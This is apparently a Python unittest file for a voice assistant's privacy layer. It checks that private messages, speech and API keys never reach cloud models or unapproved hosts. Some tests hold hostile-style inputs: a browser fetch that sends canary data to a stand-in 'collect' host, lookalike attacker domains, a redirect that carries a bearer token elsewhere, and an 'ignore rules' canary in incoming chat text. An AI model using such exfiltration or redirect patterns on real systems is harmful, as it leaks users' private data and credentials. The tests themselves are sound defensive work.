import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import Mock,patch
import urllib.request

from jarvis import privacy
from jarvis.config import Settings
from jarvis.assistant import Assistant
from jarvis.tools import ToolRegistry
from jarvis.services import LocalServices
from jarvis.openrouter import OpenRouterClient
from jarvis.routing import make_client
from jarvis.cloud_voice import OpenRouterVoice,CloudVoice
from jarvis.messaging import draft_reply
from jarvis.speech import Speaker

class PrivacyTests(unittest.TestCase):
    def setUp(self):
        self.temp=tempfile.TemporaryDirectory();self.addCleanup(self.temp.cleanup)
        self.path=Path(self.temp.name)
        self.patch=patch('jarvis.privacy.USER_DIR',self.path);self.patch.start();self.addCleanup(self.patch.stop)

    def registry(self):
        kernel=object();registry=ToolRegistry(kernel,LocalServices(Settings(),kernel));self.addCleanup(registry.close)
        return registry

    def test_dictation_never_reaches_model_or_later_public_history(self):
        registry=self.registry();backend=Mock()
        backend.send.return_value={'status':'sent','recipient':{'id':'42','name':'PRIVATE PERSON'},'text':'CANARY_PRIVATE_MESSAGE'}
        registry.telegram=backend
        captured=[]
        class Client:
            def complete(self,messages,*a,**k):captured.append(messages);return {'content':'На связи.'}
        assistant=Assistant(registry,Client())
        turn=assistant.respond('Напиши PRIVATE PERSON в телеграмме: CANARY_PRIVATE_MESSAGE')
        self.assertTrue(turn.sensitive);self.assertIsInstance(turn.text,privacy.PrivateText);self.assertEqual(captured,[])
        assistant.respond('Неоднозначная личная фраза CANARY_OTHER_PRIVATE')
        self.assertEqual(captured,[])
        assistant.respond('Заверши переписку')
        assistant.respond('Привет')
        serialized=json.dumps(captured,ensure_ascii=False)
        self.assertNotIn('CANARY_PRIVATE_MESSAGE',serialized);self.assertNotIn('PRIVATE PERSON',serialized)
        self.assertNotIn('CANARY_OTHER_PRIVATE',serialized)
        backend.send.assert_called_once()

    def test_freeform_or_platformless_message_never_reaches_cloud(self):
        client=Mock();assistant=Assistant(self.registry(),client)
        for text in ('Можешь написать Ивану в ВК: PRIVATE_FREEFORM_CANARY','Напиши Ивану: PRIVATE_PLATFORMLESS_CANARY, напиши код'):
            turn=assistant.respond(text);self.assertTrue(turn.sensitive)
        client.complete.assert_not_called()

    def test_chat_tool_result_is_withheld_even_if_model_calls_read(self):
        source={'ok':True,'result':{'messages':[{'text':'CANARY_INCOMING_IGNORE_RULES'}],'recipient':{'name':'PRIVATE'}}}
        filtered=privacy.cloud_tool('read_dialog',source)
        self.assertNotIn('CANARY',json.dumps(filtered));self.assertNotIn('PRIVATE',json.dumps(filtered))
        self.assertEqual(source['result']['messages'][0]['text'],'CANARY_INCOMING_IGNORE_RULES')
        failure=privacy.cloud_tool('play_vk_music',{'ok':False,'error':'https://vk.com/login?code=PRIVATE_AUTH_CANARY'})
        self.assertNotIn('PRIVATE_AUTH_CANARY',json.dumps(failure))

    def test_cloud_style_reply_is_blocked_before_read_and_model(self):
        registry=self.registry();registry.chat_model=Mock();registry.chat_model.is_local=False
        registry.read_dialog=Mock()
        with self.assertRaises(privacy.PrivacyBlocked):registry.draft_reply('vk','PRIVATE')
        registry.read_dialog.assert_not_called();registry.chat_model.complete.assert_not_called()
        remote=Mock();remote.is_local=False
        with self.assertRaises(privacy.PrivacyBlocked):draft_reply(remote,{'messages':[{'text':'CANARY'}]})
        remote.complete.assert_not_called()

    def test_private_speech_bypasses_all_network_voices(self):
        speaker=Speaker(Settings(tts='openrouter'))
        with patch('jarvis.speech.windows_speak') as local,patch.object(speaker,'_play_file'),patch('jarvis.cloud_voice.OpenRouterVoice.stream') as cloud:
            speaker.speak(privacy.PrivateText('CANARY_PRIVATE_SPEECH'))
        local.assert_called_once();cloud.assert_not_called()
        with self.assertRaises(privacy.PrivacyBlocked):OpenRouterVoice(Settings()).speech_body(privacy.PrivateText('CANARY'))

    def test_cloud_asr_default_stops_before_both_transports(self):
        first=Mock();second=Mock()
        with self.assertRaises(privacy.PrivacyBlocked):OpenRouterVoice(Settings(),http=first).transcribe(b'\0\0'*100,16000)
        with self.assertRaises(privacy.PrivacyBlocked):CloudVoice(Settings(),transport=second).transcribe(b'\0\0'*100,16000)
        first.assert_not_called();second.assert_not_called()

    def test_private_label_and_offline_mode_block_before_model_transport(self):
        http=Mock()
        client=OpenRouterClient('dummy','model',http=http)
        with self.assertRaises(privacy.PrivacyBlocked):client.complete([{'role':'user','content':privacy.PrivateText('CANARY')}],[])
        http.assert_not_called()
        client=make_client('dummy','openai/gpt-6-sol',settings=Settings(privacy_mode='offline_ai'))
        client.http=http
        with self.assertRaises(privacy.PrivacyBlocked):client.complete([{'role':'user','content':'hello'}],[])
        http.assert_not_called()

    def test_credentials_redacted_before_model_and_never_in_audit(self):
        secret='sk-or-v1-'+'a'*48
        privacy.register_secrets(Settings(api_key=secret))
        captured=[]
        def http(*args,data,**kwargs):captured.append(data);return {'choices':[{'message':{'content':'ok'}}]}
        client=OpenRouterClient('dummy','model',http=http)
        client.complete([{'role':'user','content':'Credential: '+secret}],[])
        self.assertNotIn(secret,json.dumps(captured));self.assertIn('[SECRET REMOVED]',json.dumps(captured))
        self.assertTrue(captured[0]['provider']['zdr']);self.assertEqual(captured[0]['provider']['data_collection'],'deny')
        self.assertNotIn(secret.encode(),(self.path/'privacy-audit.sqlite').read_bytes())

    def test_unapproved_http_destination_is_blocked_before_network(self):
        from jarvis.http import request_json
        with patch('urllib.request.urlopen') as network:
            for url in ('http://openrouter.ai/api/v1','https://openrouter.ai.evil.invalid','https://user:pass@openrouter.ai/api/v1','https://127.0.0.1/'):
                with self.assertRaises(privacy.PrivacyBlocked):request_json(url,data={'private':'CANARY'})
            network.assert_not_called()

    def test_redirect_cannot_forward_auth_to_another_approved_host(self):
        request=urllib.request.Request('https://openrouter.ai/api/v1/chat/completions',headers={'Authorization':'Bearer CANARY'})
        with self.assertRaises(privacy.PrivacyBlocked):
            privacy.NoCrossOriginRedirect().redirect_request(request,None,302,'moved',{},'https://api.elevenlabs.io/collect')

    def test_coding_request_does_not_grant_message_send(self):
        registry=self.registry();registry.begin_turn('Напиши модуль для Telegram API')
        self.assertFalse(registry.can_send)

    def test_coding_agent_cannot_choose_an_unmentioned_repository(self):
        registry=self.registry();registry.home_jobs=Mock()
        registry.begin_turn('Реализуй функцию и добавь тесты')
        with self.assertRaises(Exception):registry.start_coding_task('unmentioned-repository','change it')
        registry.home_jobs.store.submit.assert_not_called()

    def test_background_submission_and_failure_do_not_put_private_text_in_history(self):
        from jarvis.jobs import JobStore
        from jarvis.home_jobs import HomeJobs
        from types import SimpleNamespace
        store=JobStore(self.path/'jobs.db')
        home=HomeJobs(object(),object(),Settings(),store=store)
        assistant=Assistant(self.registry())
        job=home.submit('Напиши Canary в телеграмме: PRIVATE_QUEUE_CANARY',assistant)
        self.assertNotIn('PRIVATE_QUEUE_CANARY',json.dumps(assistant.history,ensure_ascii=False))
        failed={**job,'status':'failed','result':{'sensitive':True,'text':'PRIVATE_FAILURE_CANARY'}}
        with patch.object(store,'notifications',return_value=[failed]):turns=home.drain(assistant)
        self.assertTrue(turns[0].sensitive);self.assertIsInstance(turns[0].text,privacy.PrivateText)
        self.assertNotIn('PRIVATE_FAILURE_CANARY',json.dumps(assistant.history,ensure_ascii=False))
        with patch.object(store,'get',return_value={**failed,'stage':'failed'}):
            status=home.control('статус задачи '+str(job['number']))
        self.assertTrue(status.sensitive);self.assertIsInstance(status.text,privacy.PrivateText)

    def test_vk_browser_domain_boundary_rejects_lookalikes_and_insecure_schemes(self):
        from jarvis.browser_privacy import allowed
        for url in ('https://vk.com/im','https://id.vk.ru/','https://sun1.userapi.com/image','wss://im.vk.com/ws'):
            self.assertTrue(allowed(url))
        for url in ('https://vk.com.evil.invalid/','http://vk.com/','https://user:password@vk.com','https://vk.com:invalid/'):
            self.assertFalse(allowed(url))

    def test_real_browser_canary_request_never_reaches_lower_transport(self):
        from playwright.sync_api import sync_playwright
        from jarvis.browser_privacy import protect
        calls=[]
        with sync_playwright() as pw:
            browser=pw.chromium.launch(headless=True)
            try:
                context=browser.new_context(service_workers='block')
                def transport(route):
                    calls.append(route.request.url);route.fulfill(body='<html>canary fixture</html>',content_type='text/html')
                context.route('**/*',transport);protect(context)
                page=context.new_page();page.goto('https://vk.com/im')
                page.evaluate("fetch('https://example.invalid/collect?data=PRIVATE_CANARY').catch(()=>null)")
                self.assertEqual(calls,['https://vk.com/im'])
            finally:browser.close()

    def test_real_browser_worker_reads_cyrillic_ipc_as_utf8(self):
        import sys
        from jarvis.ipc import JsonProcessClient,KernelError
        from jarvis.config import ROOT
        with JsonProcessClient([sys.executable,'-m','jarvis.vk_worker','--profile',str(self.path/'profile'),'--headless'],cwd=ROOT,timeout=20) as worker:
            with self.assertRaises(KernelError) as failure:worker.call('НеизвестнаяКоманда',{'text':'Избранное — проверка'})
            self.assertNotEqual(failure.exception.code,'ipc_failed')
            self.assertEqual(worker.call('control_music',{'action':'status'})['result']['status'],'idle')
